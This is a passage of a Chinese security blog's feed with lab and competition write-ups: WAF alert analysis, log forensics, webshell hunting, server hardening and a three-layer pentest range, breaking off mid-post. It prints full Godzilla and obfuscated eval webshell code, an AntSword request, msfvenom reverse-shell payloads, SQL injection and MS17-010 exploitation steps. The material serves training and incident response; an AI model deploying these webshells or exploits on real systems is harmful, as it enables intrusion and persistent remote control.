        <content type="html"><![CDATA[<p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921182817160.png"></p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>看访问路径中是否存在特殊文件或路径</p><p>这里访问敏感文件<code>/etc/passwd</code></p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921183250065.png"></p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921183418888.png"></p><p>.git泄露</p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921193047252.png"></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>请求参数或请求体中是否包含JavaScript代码</p><pre class="language-none"><code class="language-none">test%3E%3Cscript%3Ealert%28777%29%3C%2Fscript%3Etest&gt;&lt;script&gt;alert(777)&lt;&#x2F;script&gt;</code></pre><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921184937205.png"></p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921185056273.png"></p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>看请求参数、请求头、请求体中是否包含恶意代码</p><blockquote><p>像是<code>Struts2</code>的流量</p></blockquote><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921190312460.png"></p><blockquote><p>Struts2的 OGNL 表达式注入漏洞</p></blockquote><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921190926859.png"></p><blockquote><p>Cookie解码,测试命令注入</p></blockquote><pre class="language-none"><code class="language-none">tc3JKIe03WavIA8cdTcC1Q&#x3D;&#x3D;&quot;|ping -n 21 127.0.0.1 ||;</code></pre><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921192745151.png"></p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><code>admin</code>敏感路径</p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921190421529.png"></p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921190713134.png"></p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>IIS 文件名解析漏洞</p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921192129409.png"></p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>UA头暴露了<code>gobuster</code>工具</p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921192341106.png"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>请求中存在SQL代码</p><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921192526259.png"></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>蚁剑</p><pre class="language-none"><code class="language-none">POST &#x2F;shell.php HTTP&#x2F;1.1Host: xxxAccept-Encoding: gzip, deflateUser-Agent: antSword&#x2F;v2.1Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 985Connection: closecmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2299574%22%3Becho%20%40asenc(%24output)%3Becho%20%2218c85%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B</code></pre><p><img src="/%5Cimages%5Cposts%5C%E9%9B%B7%E6%B1%A0WAF%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%5Cimage-20240921193508395.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二章日志分析-apache日志分析</title>
      <link href="/2024/11/11/2024-09-21-%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/11/2024-09-21-%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><pre class="language-none"><code class="language-none">1、提交当天访问次数最多的IP，即黑客IP：2、黑客使用的浏览器指纹是什么，提交指纹的md5：3、查看index.php页面被访问的次数，提交次数：4、查看黑客IP访问了多少次，提交次数：5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</code></pre><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>日志路径<code>/var/log/apache2/access.log.1</code></p><p><img src="/%5Cimages%5Cposts%5C%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%5Cimage-20240921201255805.png"></p><p>flag{192.168.200.2}</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>用的是谷歌浏览器</p><pre class="language-none"><code class="language-none">Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</code></pre><p><img src="/%5Cimages%5Cposts%5C%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%5Cimage-20240921201611974.png"></p><p>flag{2d6330f380f44ac20f3a02eed0958f66}</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><pre class="language-none"><code class="language-none">grep &quot;&#x2F;index.php&quot; access.log.1 |wc -l</code></pre><p><img src="/%5Cimages%5Cposts%5C%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%5Cimage-20240921203050278.png"></p><p>flag{27}</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><pre class="language-none"><code class="language-none">grep &quot;192.168.200.2 - -&quot; access.log.1 |wc -l</code></pre><p><img src="/%5Cimages%5Cposts%5C%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%5Cimage-20240921203554618.png"></p><p>flag{6555}</p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>这里是IP的个数</p><pre class="language-none"><code class="language-none">cat access.log.1 | grep &quot;03&#x2F;Aug&#x2F;2023:08:&quot; | awk &#39;&#123;print $1&#125;&#39; | sort -nr| uniq -c</code></pre><p><img src="/%5Cimages%5Cposts%5C%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%5Cimage-20240921203538067.png"></p><p>flag{5}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CFS三层靶场渗透</title>
      <link href="/2024/11/11/2024-09-21-CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2024/11/11/2024-09-21-CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Target1"><a href="#Target1" class="headerlink" title="Target1"></a>Target1</h1><p>页面TP框架,工具扫描写马</p><p><img src="/%5Cimages%5Cposts%5CCFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%5Cimage-20240921133451060.png"></p><p>下面有两个flag,<code>robots</code>.txt和<code>flag21sA.txt</code></p><p><img src="/images%5Cposts%5CCFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%5Cimage-20240921133618555.png"></p><h1 id="Target2"><a href="#Target2" class="headerlink" title="Target2"></a>Target2</h1><p><code>ifconfig</code>还存在另一个22网段,msf上线挂代理访问另一网段</p><pre class="language-none"><code class="language-none">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.235.128  LPORT&#x3D;6666 -f elf &gt; test.elfmsfconsole                                         use exploit&#x2F;multi&#x2F;handler                          set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp    set lhost 192.168.53.135                         set lport 6666                                    exploit</code></pre><p>添加路由</p><pre class="language-none"><code class="language-none">run post&#x2F;multi&#x2F;manage&#x2F;autorouterun autoroute -p</code></pre><p>设置代理</p><pre class="language-none"><code class="language-none">use auxiliary&#x2F;server&#x2F;socks_proxyset version 4arun</code></pre><p>kali代理</p><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;proxychains4.confsocks4  127.0.0.1 1080</code></pre><p><code>msf</code>扫描存活主机<code>192.168.22.129</code></p><pre class="language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweepset rhosts 192.168.22.1-255</code></pre><p>主机挂代理访问,对<code>Tatrget2</code>进行渗透</p><p><img src="/images%5Cposts%5CCFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%5Cimage-20240921141118610.png"></p><p>页面源码提示sql注入</p><p><img src="/images%5Cposts%5CCFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%5Cimage-20240921143623496.png"></p><p><code>sqlmap</code>或者手注</p><pre class="language-none"><code class="language-none">proxychains4 sqlmap -u &quot;http:&#x2F;&#x2F;192.168.22.129&#x2F;index.php?r&#x3D;vul&amp;keyword&#x3D;1&quot;1&#39; union select group_concat(username),group_concat(password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from bage_admin-- -</code></pre><p>密码<code>46f94c8de14fb36680850768ff1b7f2a</code>解密后为<code>123qwe</code></p><p>登录后台拿到flag3</p><p>登录后台后点击<code>模板</code>,下面<code>site</code>下的<code>index.php</code>就是网站首页</p><p><img src="/images%5Cposts%5CCFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%5Cimage-20240921144357471.png"></p><p>写马后蚁剑挂代理连接,里面又发现<code>flag42Fs.txt</code></p><h1 id="Tatget3"><a href="#Tatget3" class="headerlink" title="Tatget3"></a>Tatget3</h1><p><code>ifconfig</code>两个网段,再次上线<code>msf</code></p><pre class="language-none"><code class="language-none">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;3333 -f elf &gt; test.elfuse exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpset rhost 192.168.22.129set LPORT 3333run</code></pre><p>扫描存活主机<code>192.168.33.33</code></p><pre class="language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweepset rhosts 192.168.33.1-255</code></pre><p>端口扫描</p><pre class="language-none"><code class="language-none">proxychains4 nmap -Pn -sT 192.168.33.33</code></pre><p>扫描到<code>445</code>端口开放,探测<code>永恒之蓝</code>漏洞</p><pre class="language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010set rhosts 192.168.33.33run</code></pre><p>探测到存在,进行利用</p><pre class="language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexecset payload windows&#x2F;meterpreter&#x2F;bind_tcpset RHOST 192.168.33.33run</code></pre><p>成功获取shell</p><pre class="language-none"><code class="language-none">dir &#x2F;S *flag* &#x2F;Btype C:\Users\Administrator\Desktop\flag.txt</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一章 应急响应-webshell查杀</title>
      <link href="/2024/11/11/2024-09-20-%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/"/>
      <url>/2024/11/11/2024-09-20-%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><pre class="language-none"><code class="language-none">1.web目录存在木马，请找到木马的密码提交2.服务器疑似存在不死马，请找到不死马的密码提交3.不死马是通过哪个文件生成的，请提交文件名4.黑客留下了木马文件，请找出黑客的服务器ip提交5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</code></pre><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><a href="https://n.shellpub.com/">河马在线查杀</a></p><p>![](\images\posts\第一章 应急响应-webshell查杀\1726758085416.jpg)</p><p><code>/html/include/gz.php</code>哥斯拉马</p><pre class="language-none"><code class="language-none">&lt;?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K)&#123;    for($i&#x3D;0;$i&lt;strlen($D);$i++) &#123;        $c &#x3D; $K[$i+1&amp;15];        $D[$i] &#x3D; $D[$i]^$c;    &#125;    return $D;&#125;&#x2F;&#x2F;027ccd04-5065-48b6-a32d-77c704a5e26d$payloadName&#x3D;&#39;payload&#39;;$key&#x3D;&#39;3c6e0b8a9c15224a&#39;;$data&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);if ($data!&#x3D;&#x3D;false)&#123;    $data&#x3D;encode($data,$key);    if (isset($_SESSION[$payloadName]))&#123;        $payload&#x3D;encode($_SESSION[$payloadName],$key);        if (strpos($payload,&quot;getBasicsInfo&quot;)&#x3D;&#x3D;&#x3D;false)&#123;            $payload&#x3D;encode($payload,$key);        &#125;eval($payload);        echo encode(@run($data),$key);    &#125;else&#123;        if (strpos($data,&quot;getBasicsInfo&quot;)!&#x3D;&#x3D;false)&#123;            $_SESSION[$payloadName]&#x3D;encode($data,$key);        &#125;    &#125;&#125;</code></pre><p><code>flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</code></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p><a href="https://github.com/BeichenDream/Godzilla">哥斯拉GitHub地址</a></p><p><code>flag&#123;39392de3218c333f794befef07ac9257&#125;</code></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><code>/include/Db/.Mysqli.php</code>下哥斯拉马</p><p><code>flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</code></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php下</p><pre class="language-none"><code class="language-none">&lt;?php$key &#x3D; &quot;password&quot;;&#x2F;&#x2F;ERsDHgEUC1hI$fun &#x3D; base64_decode($_GET[&#39;func&#39;]);for($i&#x3D;0;$i&lt;strlen($fun);$i++)&#123;    $fun[$i] &#x3D; $fun[$i]^$key[$i+1&amp;7];&#125;$a &#x3D; &quot;a&quot;;$s &#x3D; &quot;s&quot;;$c&#x3D;$a.$s.$_GET[&quot;func2&quot;];$c($fun);</code></pre><p><code>flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一章 应急响应-Linux日志分析</title>
      <link href="/2024/11/11/2024-09-20-%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/11/2024-09-20-%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h1><pre class="language-none"><code class="language-none">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割4.登陆成功的IP共爆破了多少次5.黑客登陆主机后新建了一个后门用户，用户名是多少</code></pre><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="有多少IP在爆破主机ssh的root帐号"><a href="#有多少IP在爆破主机ssh的root帐号" class="headerlink" title="有多少IP在爆破主机ssh的root帐号"></a>有多少IP在爆破主机ssh的root帐号</h2><p><code>uname -a</code>为<code>Debian</code>,一般在<code>/var/log/auth.log</code>下.</p><p>这题是<code>/var/log/auth.log.1</code></p><pre class="language-none"><code class="language-none">cat auth.log.1 | grep -a &quot;Failed password for root from&quot;</code></pre><p>查看到三个IP</p><p><code>192.168.200.32</code><br><code>192.168.200.2</code><br><code>192.168.200.31</code></p><h2 id="ssh爆破成功登陆的IP是多少"><a href="#ssh爆破成功登陆的IP是多少" class="headerlink" title="ssh爆破成功登陆的IP是多少"></a>ssh爆破成功登陆的IP是多少</h2><pre class="language-none"><code class="language-none">cat auth.log.1 | grep -a &quot;Accepted password for root from&quot;</code></pre><p>查看到<code>192.168.200.2</code></p><h2 id="爆破用户名字典是什么"><a href="#爆破用户名字典是什么" class="headerlink" title="爆破用户名字典是什么"></a>爆破用户名字典是什么</h2><p>用户名不存在会提示<code>Failed password for invalid user</code></p><pre class="language-none"><code class="language-none">cat auth.log.1 | grep -a &quot;Failed password for invalid user&quot;</code></pre><pre class="language-none"><code class="language-none">roottest1test2test3userhello</code></pre><h2 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h2><pre class="language-none"><code class="language-none">cat auth.log.1 | grep -a &quot;192.168.200.2&quot; | grep -a &quot;Failed password for root from&quot; | wc -l</code></pre><p>这里是爆破<code>root</code>的次数,共四次</p><h2 id="新建了一个后门用户，用户名是多少"><a href="#新建了一个后门用户，用户名是多少" class="headerlink" title="新建了一个后门用户，用户名是多少"></a>新建了一个后门用户，用户名是多少</h2><p>创建用户日志<code>new user</code></p><pre class="language-none"><code class="language-none">cat auth.log.1 |grep -a &quot;new user&quot;</code></pre><p>添加了<code>test</code>,<code>/etc/passwd</code>也是显示后面添加.<code>debian</code>是docker创建的</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穗港澳蓉技能竞赛A模块2.3</title>
      <link href="/2024/11/11/2024-09-19-%E7%A9%97%E6%B8%AF%E6%BE%B3%E8%93%89%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9BA%E6%A8%A1%E5%9D%972.3/"/>
      <url>/2024/11/11/2024-09-19-%E7%A9%97%E6%B8%AF%E6%BE%B3%E8%93%89%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9BA%E6%A8%A1%E5%9D%972.3/</url>
      
        <content type="html"><![CDATA[<h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p><img src="/%5Cimages%5Cposts%5C%E7%A9%97%E6%B8%AF%E6%BE%B3%E8%93%89%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9BA%E6%A8%A1%E5%9D%972.3%5Cb56363dbdc3da13771bad6a58d318867.png"></p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一:"></a>问题一:</h2><p><strong>第一步:配置SSL证书</strong></p><p>用OpenSSL创建自签名密钥和证书对</p><pre class="language-none"><code class="language-none">sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout &#x2F;etc&#x2F;ssl&#x2F;private&#x2F;apache-selfsigned.key -out &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;apache-selfsigned.crt</code></pre><blockquote><ul><li><strong>openssl</strong>：这是用于创建和管理OpenSSL证书，密钥和其他文件的基本命令行工具。</li><li><strong>req</strong>：此子命令指定我们要使用X.509证书签名请求（CSR）管理。“X.509”是SSL和TLS为其密钥和证书管理所遵循的公钥基础结构标准。因为我们想要创建一个新的X.509证书，所以我们使用这个子命令。</li><li><strong>-x509</strong>：这通过告诉实用程序我们要创建自签名证书而不是生成证书签名请求来进一步修改上一个子命令。</li><li><strong>-nodes</strong>：这告诉OpenSSL跳过用密码保护我们的证书的选项。我们需要Apache在服务器启动时能够在没有用户干预的情况下读取文件。</li><li><strong>-days 365</strong>：此选项设置证书有效的时间长度。我们在这里设置了一年。</li><li><strong>-newkey rsa:2048</strong>：这指定我们要同时生成新证书和新密钥。我们没有创建在上一步中签署证书所需的密钥，因此我们需要将其与证书一起创建。<code>rsa:2048</code>部分告诉它制作一个2048位长的RSA密钥。</li><li><strong>-keyout</strong>：这一行告诉OpenSSL在哪里放置我们正在创建的生成的私钥文件。</li><li><strong>-out</strong>：这告诉OpenSSL在哪里放置我们正在创建的证书。</li></ul></blockquote><p><strong>第二步:配置Apache以使用SSL</strong></p><p><code>修改默认Apache SSL配置文件文件</code></p><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;default-ssl.conf</code></pre><p><img src="/%5Cimages%5Cposts%5C%E7%A9%97%E6%B8%AF%E6%BE%B3%E8%93%89%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9BA%E6%A8%A1%E5%9D%972.3%5C1726748067198.jpg"></p><p>这两行改成证书的位置</p><pre class="language-none"><code class="language-none">SSLCertificateFile       &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;apache-selfsigned.crtSSLCertificateKeyFile  &#x2F;etc&#x2F;ssl&#x2F;private&#x2F;apache-selfsigned.key</code></pre><p><strong>第三步:修改HTTP主机文件以重定向到HTTPS</strong></p><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf</code></pre><p>添加Redirect指令,<code>Redirect &quot;/&quot; &quot;https://192.168.235.130&quot;</code>,将所有流量指向站点的SSL</p><p><strong>启用Apache并生效更改</strong></p><pre class="language-none"><code class="language-none">a2enmod ssla2ensite default-ssla2enconf ssl-paramsapache2ctl configtestsystemctl restart apache2</code></pre><h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h2><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</code></pre><p>把<code>Options Indexes FollowSymLinks</code>换成<code>Options -Indexes +FollowSymLinks</code>或者直接删掉<code>Indexes </code></p><h2 id="问题三"><a href="#问题三" class="headerlink" title="问题三"></a>问题三</h2><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</code></pre><p>在底部添加</p><pre class="language-none"><code class="language-none">ServerTokens ProdServerSignature off</code></pre><h2 id="问题四"><a href="#问题四" class="headerlink" title="问题四"></a>问题四</h2><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;vsftpd.conf </code></pre><p><code>ssl_enable=YES</code>修改成YES</p><h2 id="问题五"><a href="#问题五" class="headerlink" title="问题五"></a>问题五</h2><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;vsftpd.conf</code></pre><p><code>anonymos_enable=NO</code>修改成NO</p><h2 id="问题六"><a href="#问题六" class="headerlink" title="问题六"></a>问题六</h2><pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</code></pre><p>把<code>PermitRootLogin no</code>yes改成no</p>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应2</title>
      <link href="/2024/11/11/2024-09-19-Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942/"/>
      <url>/2024/11/11/2024-09-19-Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942/</url>
      
        <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="攻击者IP"><a href="#攻击者IP" class="headerlink" title="攻击者IP"></a>攻击者IP</h2><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726665834303.jpg"></p><p>查看网站日志,<code>192.168.20.1</code>一直扫</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726666180651.jpg"></p><p>last显示<code>192.168.20.1</code>也在登录,基本确定攻击者IP</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726666101310.jpg"></p><h2 id="修改的管理员密码"><a href="#修改的管理员密码" class="headerlink" title="修改的管理员密码"></a>修改的管理员密码</h2><p>登录数据库,第二页<code>x2_user</code>下发现账号密码.一眼MD5</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726667818768.jpg"></p><p>加密逻辑,没有加盐</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726667878036.jpg"></p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726667948733.jpg"></p><h2 id="第一次Webshell的连接URL"><a href="#第一次Webshell的连接URL" class="headerlink" title="第一次Webshell的连接URL"></a>第一次Webshell的连接URL</h2><p>登录后台&#x3D;&#x3D;&gt;后台管理&#x3D;&#x3D;&gt;内容&#x3D;&#x3D;&gt;标签管理&#x3D;&#x3D;&gt;注册协议查看到马</p><p><img src="/%5Cimages%5Cposts%5CLinux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%942%5C1726732764898.jpg"></p><p>点击注册<code>http://192.168.235.131/index.php?user-app-register</code>进行链接</p><h2 id="Webshell连接密码"><a href="#Webshell连接密码" class="headerlink" title="Webshell连接密码"></a>Webshell连接密码</h2><p>webshell密码<code>Network2020</code></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>wireshark过滤<code>tcp.stream eq 